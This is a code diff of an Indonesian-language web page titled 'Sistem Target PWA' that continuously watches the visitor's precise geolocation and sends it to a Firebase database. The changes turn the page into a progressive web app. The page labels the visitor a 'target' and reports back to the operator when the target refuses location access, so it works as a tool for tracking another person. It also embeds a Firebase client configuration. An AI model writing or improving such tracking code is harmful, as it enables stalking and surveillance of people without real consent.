@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Target</title>
+    <title>Sistem Target PWA</title>
     <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#317EFB">
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
         import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
 
-        // Konfigurasi Firebase Anda
         const firebaseConfig = {
             apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
             authDomain: "coba-accf3.firebaseapp.com",
@@ -20,17 +20,12 @@
             appId: "1:171764982868:web:19c716f6617667514679c1"
         };
 
-        // Inisialisasi Firebase
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Fungsi untuk mendapatkan lokasi
         function getLocation() {
-            console.log("Meminta lokasi...");
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(showPosition, showError, {
-                    enableHighAccuracy: true
-                });
+                navigator.geolocation.watchPosition(showPosition, showError, { enableHighAccuracy: true });
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
@@ -39,28 +34,16 @@
         function showPosition(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-
-            // Mengirim data lokasi ke Firebase
-            const locationRef = ref(database, 'devices/device1'); // ID perangkat unik
-            set(locationRef, {
-                latitude: lat,
-                longitude: lon,
-                timestamp: Date.now()
-            });
-
-            // Menghapus pesan penolakan izin (jika ada)
-            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
-            remove(notificationRef);
+            const locationRef = ref(database, 'devices/device1');
+            set(locationRef, { latitude: lat, longitude: lon, timestamp: Date.now() });
+            remove(ref(database, 'notifications/device1'));
         }
 
         function showError(error) {
-            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
-            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
+            const notificationRef = ref(database, 'notifications/device1');
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    set(notificationRef, {
-                        message: "Target tidak izinkan lokasi"
-                    });
+                    set(notificationRef, { message: "Target tidak izinkan lokasi" });
                     break;
                 case error.POSITION_UNAVAILABLE:
                     alert("Location information is unavailable.");
@@ -74,25 +57,19 @@
             }
         }
 
-        // Mulai mendapatkan lokasi saat halaman dimuat
-        window.onload = getLocation;
+        window.onload = () => {
+            getLocation();
+            // Register service worker for PWA
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/service-worker.js')
+                    .then((reg) => console.log('Service Worker registered', reg))
+                    .catch((err) => console.error('Service Worker registration failed', err));
+            }
+        };
     </script>
 </head>
 <body>
-    <h1>Sistem Target</h1>
+    <h1>Sistem Target PWA</h1>
     <p>Memantau lokasi perangkat...</p>
-
-    <script>
-        // Registrasi Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js')
-            .then((registration) => {
-                console.log('Service Worker registered with scope:', registration.scope);
-            })
-            .catch((error) => {
-                console.log('Service Worker registration failed:', error);
-            });
-        }
-    </script>
 </body>
 </html>
